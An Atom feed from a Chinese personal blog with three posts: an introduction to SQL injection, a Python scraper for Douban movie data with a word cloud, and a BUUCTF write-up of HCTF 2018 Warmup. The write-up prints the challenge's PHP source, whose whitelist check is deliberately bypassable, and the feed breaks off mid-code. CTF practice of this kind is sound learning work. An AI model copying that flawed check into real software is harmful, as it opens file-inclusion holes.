<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>huhuの博客</title>
  
  <subtitle>记录生活中的点点滴滴</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-11-22T12:41:58.363Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>huhu</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SQL注入</title>
    <link href="http://example.com/2021/11/22/SQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://example.com/2021/11/22/SQL%E6%B3%A8%E5%85%A5/</id>
    <published>2021-11-22T05:46:24.000Z</published>
    <updated>2021-11-22T12:41:58.363Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、注入原理"><a href="#一、注入原理" class="headerlink" title="一、注入原理"></a>一、注入原理</h2><p>​    由于B/S(客户端 / 服务器模式)建立在互联网上，对安全控制能力较弱。开发人员在编写代码时对用户的<strong>输入没有进行严格的合法性判断</strong>，导致<strong>攻击者可以利用这个漏洞提交一段数据库查询代码</strong>，进而获取数据库中的一些信息。</p><img src="/2021/11/22/SQL%E6%B3%A8%E5%85%A5/1.png" alt="相对路径图片" style="zoom:55%;"><h2 id="二、Mysql常用函数"><a href="#二、Mysql常用函数" class="headerlink" title="二、Mysql常用函数"></a>二、Mysql常用函数</h2><img src="/2021/11/22/SQL%E6%B3%A8%E5%85%A5/2.png" alt="相对路径图片" style="zoom:55%;"><p>在返回数据库名时，要先使用一个数据库</p><img src="/2021/11/22/SQL%E6%B3%A8%E5%85%A5/3.png" alt="相对路径图片" style="zoom:55%;">]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、注入原理&quot;&gt;&lt;a href=&quot;#一、注入原理&quot; class=&quot;headerlink&quot; title=&quot;一、注入原理&quot;&gt;&lt;/a&gt;一、注入原理&lt;/h2&gt;&lt;p&gt;​    由于B/S(客户端 / 服务器模式)建立在互联网上，对安全控制能力较弱。开发人员在编写代码时对用户</summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    
    <category term="SQL" scheme="http://example.com/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>豆瓣电影分类爬取</title>
    <link href="http://example.com/2021/11/20/%E8%B1%86%E7%93%A3%E7%94%B5%E5%BD%B1%E5%88%86%E7%B1%BB%E7%88%AC%E5%8F%96/"/>
    <id>http://example.com/2021/11/20/%E8%B1%86%E7%93%A3%E7%94%B5%E5%BD%B1%E5%88%86%E7%B1%BB%E7%88%AC%E5%8F%96/</id>
    <published>2021-11-20T14:40:24.000Z</published>
    <updated>2021-11-20T15:03:31.245Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#爬取的过程中最难的对我来说就是正则表达式构建了，试了听多次的</span></span><br><span class="line"></span><br><span class="line">ciyun.py</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">作者：SMY</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> jieba</span><br><span class="line"><span class="keyword">import</span> wordcloud</span><br><span class="line"><span class="keyword">import</span> 豆瓣</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getHtml</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;获取url页面&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Cookie&#x27;</span> : yours,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: yours,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https: // movie.douban.com / subject / 26752088 / comments?status = P&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    req = urllib.request.Request(url,headers=headers)</span><br><span class="line">    req = urllib.request.urlopen(req)</span><br><span class="line">    content = req.read().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getComment</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;解析HTML页面&quot;&quot;&quot;</span></span><br><span class="line">    html = getHtml(url)</span><br><span class="line">    soupComment = BeautifulSoup(html, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    comments = soupComment.findAll(<span class="string">&#x27;span&#x27;</span>, <span class="string">&#x27;short&#x27;</span>)</span><br><span class="line">    onePageComments = []</span><br><span class="line">    <span class="keyword">for</span> comment <span class="keyword">in</span> comments:</span><br><span class="line">        <span class="comment"># print(comment.getText()+&#x27;\n&#x27;)</span></span><br><span class="line">        onePageComments.append(comment.getText()+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> onePageComments</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wordAnalysis</span>(<span class="params">name</span>):</span></span><br><span class="line">    stopwords = [<span class="string">&#x27;的&#x27;</span>,<span class="string">&#x27;是&#x27;</span>,<span class="string">&#x27;了&#x27;</span>,<span class="string">&#x27;噢&#x27;</span>,<span class="string">&#x27;也&#x27;</span>,<span class="string">&#x27;他&#x27;</span>,<span class="string">&#x27;我&#x27;</span>,<span class="string">&#x27;看&#x27;</span>,<span class="string">&#x27;在&#x27;</span>,<span class="string">&#x27;让&#x27;</span>]</span><br><span class="line">    f = <span class="built_in">open</span>(name+<span class="string">&#x27;.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,encoding = <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    content = f.read()</span><br><span class="line">    f.close()</span><br><span class="line">    ls = jieba.lcut(content)</span><br><span class="line">    txt = <span class="string">&#x27; &#x27;</span>.join(ls)</span><br><span class="line">    w = wordcloud.WordCloud(font_path=<span class="string">&#x27;c:\windows\Fonts\STZHONGS.TTF&#x27;</span>, width=<span class="number">1000</span>, height=<span class="number">700</span>, background_color=<span class="string">&#x27;white&#x27;</span>,stopwords=stopwords)</span><br><span class="line">    w.generate(txt)</span><br><span class="line">    w.to_file(name + <span class="string">&#x27;.png&#x27;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">豆瓣.py</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">作者：SMY</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> xlwt</span><br><span class="line"><span class="keyword">from</span> fake_useragent <span class="keyword">import</span> UserAgent</span><br><span class="line"><span class="keyword">import</span> test <span class="comment">#导入另一个函数，里面是生成词云图的</span></span><br><span class="line"></span><br><span class="line">Link_comment = [] <span class="comment">#电影链接</span></span><br><span class="line">Name_movie = [] <span class="comment">#电影名称</span></span><br><span class="line">Name_people = [] <span class="comment">#用户名称</span></span><br><span class="line">Content = [] <span class="comment">#评论</span></span><br><span class="line">Content_time = [] <span class="comment">#评论时间</span></span><br><span class="line">Comment_count = [] <span class="comment">#每个电影评论条数</span></span><br><span class="line">Score = [] <span class="comment">#电影评分</span></span><br><span class="line"><span class="type">Type</span> = [] <span class="comment">#电影类型</span></span><br><span class="line">Actor = [] <span class="comment">#电影演员</span></span><br><span class="line">Nation = [] <span class="comment">#出自哪个国家</span></span><br><span class="line">Num_comment = []<span class="comment">#评价人数</span></span><br><span class="line">Year = [] <span class="comment">#年份</span></span><br><span class="line"></span><br><span class="line">findName = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&lt;span property=&quot;v:itemreviewed&quot;&gt;(.*?)&lt;/span&gt;&#x27;</span>)</span><br><span class="line">findYear = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&lt;span class=&quot;year&quot;&gt;(.*?)&lt;/span&gt;&#x27;</span>)</span><br><span class="line">findActors = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&lt;a href=&quot;.*?&quot; rel=&quot;v:starring&quot;&gt;(&gt;*?)&lt;/a&gt;&#x27;</span>)</span><br><span class="line">findType = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&lt;span property=&quot;v:genre&quot;&gt;(.*?)&lt;/span&gt;&#x27;</span>)</span><br><span class="line">findNation = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&lt;span class=&quot;pl&quot;&gt;制片国家/地区:&lt;/span&gt;(.*?)&lt;br/&gt;&#x27;</span>)</span><br><span class="line">findScore = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&lt;strong class=&quot;ll rating_num&quot; property=&quot;v:average&quot;&gt;(.*?)&lt;/strong&gt;&#x27;</span>)</span><br><span class="line">findNum_comment = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&lt;span property=&quot;v:votes&quot;&gt;(.*?)&lt;/span&gt;人评价&#x27;</span>,re.S)</span><br><span class="line"><span class="comment">#findContent = re.compile(r&#x27;&lt;span property=&quot;v:summary&quot; class=&quot;&quot;&gt;(.*?)&#x27;,re.S) 匹配不到</span></span><br><span class="line">findLink_comment = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&lt;a href=&quot;(.*?)&quot;&gt;全部.*?条&lt;/a&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">askURL</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    函数用来获取网页上的信息</span></span><br><span class="line"><span class="string">    :param url: 要爬取的网页地址</span></span><br><span class="line"><span class="string">    :return: 返回一个爬取得到的信息内容</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://movie.douban.com/&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Cookie&#x27;</span> : yourcookie,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: yours</span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.get(url, headers=headers)</span><br><span class="line">    html = response.text</span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getData1</span>():</span></span><br><span class="line">    url = <span class="string">&quot;https://movie.douban.com/subject/3541415/&quot;</span></span><br><span class="line"></span><br><span class="line">    Html = askURL(url)  <span class="comment"># 调用askURL函数用来请求网页获取源代码</span></span><br><span class="line">    soup = BeautifulSoup(Html, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> soup.find_all(<span class="string">&quot;div&quot;</span>, <span class="built_in">id</span>=<span class="string">&quot;content&quot;</span>):</span><br><span class="line">        item = <span class="built_in">str</span>(item)</span><br><span class="line"></span><br><span class="line">        movie_name = re.findall(findName,item)</span><br><span class="line">        Name_movie.append(movie_name[<span class="number">0</span>])</span><br><span class="line">        <span class="built_in">print</span>(Name_movie)</span><br><span class="line"></span><br><span class="line">        year = re.findall(findYear,item)</span><br><span class="line">        Year.append(year[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">        actors = re.findall(findActors,item)</span><br><span class="line">        Actor.append(actors)</span><br><span class="line"></span><br><span class="line">        typ = re.findall(findType,item)</span><br><span class="line">        <span class="type">Type</span>.append(typ)</span><br><span class="line"></span><br><span class="line">        nation = re.findall(findNation,item)</span><br><span class="line">        Nation.append(nation[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">        scores = re.findall(findScore,item)</span><br><span class="line">        Score.append(scores[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">        num_comment = re.findall(findNum_comment,item)</span><br><span class="line">        Num_comment.append(num_comment[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">        <span class="comment">#content = re.findall(findContent,item)</span></span><br><span class="line">        <span class="comment">#用这种方法找到content，自己试了几遍正则没匹配到……</span></span><br><span class="line">        content = ((soup.find(<span class="string">&#x27;span&#x27;</span>, attrs=&#123;<span class="string">&#x27;property&#x27;</span>: <span class="string">&#x27;v:summary&#x27;</span>&#125;)).text).replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(content)</span><br><span class="line">        Content.append(content)</span><br><span class="line"></span><br><span class="line">        link_comment = re.findall(findLink_comment,item)</span><br><span class="line">        Link_comment.append(link_comment[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(Link_comment[0][0:-8])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getData2</span>():</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    爬取评论并保存到txt中</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    f = <span class="built_in">open</span>(Name_movie[<span class="number">0</span>]+<span class="string">&#x27;.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> page <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):  <span class="comment"># 豆瓣爬取多页评论需要验证。</span></span><br><span class="line">        url = Link_comment[<span class="number">0</span>][<span class="number">0</span>:-<span class="number">8</span>]+<span class="string">&#x27;start=&#x27;</span> + <span class="built_in">str</span>(<span class="number">20</span> * page) + <span class="string">&#x27;&amp;limit=20&amp;sort=new_score&amp;status=P&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;第%s页的评论:&#x27;</span> % (page+<span class="number">1</span>))</span><br><span class="line">        <span class="built_in">print</span>(url + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> test.getComment(url):</span><br><span class="line">            f.write(<span class="built_in">str</span>(j))</span><br><span class="line">            f.write(i)</span><br><span class="line">            <span class="built_in">print</span>(j, i)</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        time.sleep(<span class="number">3</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    test.wordAnalysis(Name_movie[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">savadata</span>():</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    该函数用来存储数据，将爬到的数据存储在xls文件中</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    savepath = Name_movie[<span class="number">0</span>]+<span class="string">&quot;.xls&quot;</span></span><br><span class="line">    movie = xlwt.Workbook(encoding=<span class="string">&quot;utf-8&quot;</span>,style_compression=<span class="number">0</span>) <span class="comment">#创建一个对象</span></span><br><span class="line">    sheet = movie.add_sheet(<span class="string">&quot;豆瓣-&quot;</span>+Name_movie[<span class="number">0</span>],cell_overwrite_ok=<span class="literal">True</span>)    <span class="comment">#创建一个表格</span></span><br><span class="line"></span><br><span class="line">    col = (<span class="string">&quot;电影名称&quot;</span>,<span class="string">&quot;上映时间&quot;</span>,<span class="string">&quot;电影类型&quot;</span>,<span class="string">&quot;电影评分&quot;</span>,<span class="string">&quot;评价人数&quot;</span>,<span class="string">&quot;电影简介&quot;</span>,<span class="string">&quot;制作国家&quot;</span>)</span><br><span class="line">    <span class="comment">#写入每一列的标题</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):</span><br><span class="line">        sheet.write(<span class="number">0</span>,i,col[i])</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="comment">#向每一列中写入数据</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;第%d列&quot;</span>%(i+<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">0</span>):</span><br><span class="line">                sheet.write(j + <span class="number">1</span>, i , Name_movie[j])</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">elif</span> (i == <span class="number">1</span>):</span><br><span class="line">                sheet.write(j + <span class="number">1</span>, i, Year[j])</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">elif</span> (i == <span class="number">2</span>):</span><br><span class="line">                sheet.write(j + <span class="number">1</span>, i, <span class="type">Type</span>[j])</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">elif</span> (i == <span class="number">3</span>):</span><br><span class="line">                sheet.write(j + <span class="number">1</span>, i, Score[j])</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">elif</span> (i == <span class="number">4</span>):</span><br><span class="line">                sheet.write(j + <span class="number">1</span>, i, Num_comment[j])</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">elif</span> (i == <span class="number">5</span>) :</span><br><span class="line">                sheet.write(j + <span class="number">1</span>, i, Content[j])</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                sheet.write(j + <span class="number">1</span>, i, Nation[j])</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    movie.save(savepath)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    getData1()</span><br><span class="line">    getData2()</span><br><span class="line">    savadata()</span><br></pre></td></tr></table></figure><p><strong>具体结果呈现：</strong></p><p>电影信息：</p><img src="/2021/11/20/%E8%B1%86%E7%93%A3%E7%94%B5%E5%BD%B1%E5%88%86%E7%B1%BB%E7%88%AC%E5%8F%96/2.png" alt="相对路径图片" style="zoom:55%;"><p>评论：</p><img src="/2021/11/20/%E8%B1%86%E7%93%A3%E7%94%B5%E5%BD%B1%E5%88%86%E7%B1%BB%E7%88%AC%E5%8F%96/1.png" alt="相对路径图片" style="zoom:55%;"><p>词云图：</p><img src="/2021/11/20/%E8%B1%86%E7%93%A3%E7%94%B5%E5%BD%B1%E5%88%86%E7%B1%BB%E7%88%AC%E5%8F%96/3.png" alt="相对路径图片" style="zoom:55%;"><hr><p>爬虫目前学的知识简单的，还是只能爬一些简单的网站，类似猫眼、豆瓣，对一些动态验证的还正在涉及，继续加油。同时可能要多学学提取关键字的方法啦，只会正则有时候真的不会提取呜~</p><img src="/2021/11/20/%E8%B1%86%E7%93%A3%E7%94%B5%E5%BD%B1%E5%88%86%E7%B1%BB%E7%88%AC%E5%8F%96/bz.jpg" alt="相对路径图片" style="zoom:55%;">]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span clas</summary>
      
    
    
    
    <category term="python" scheme="http://example.com/categories/python/"/>
    
    
    <category term="爬虫" scheme="http://example.com/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>buuctf练习</title>
    <link href="http://example.com/2021/11/18/buuctf%E7%BB%83%E4%B9%A0/"/>
    <id>http://example.com/2021/11/18/buuctf%E7%BB%83%E4%B9%A0/</id>
    <published>2021-11-18T15:05:43.000Z</published>
    <updated>2021-11-20T14:41:43.175Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-HCTF-2018-Warmup"><a href="#1-HCTF-2018-Warmup" class="headerlink" title="1.[HCTF 2018]Warmup"></a>1.[HCTF 2018]Warmup</h2><p>考察：php审计：mb_substr()+mb_strpos()绕过</p><p>打开题目地址后出现的是一个滑稽的表情，接着查看原码发现注释有 source.php ，访问后得到一段源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>]; <span class="comment">//白名单</span></span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = urldecode(<span 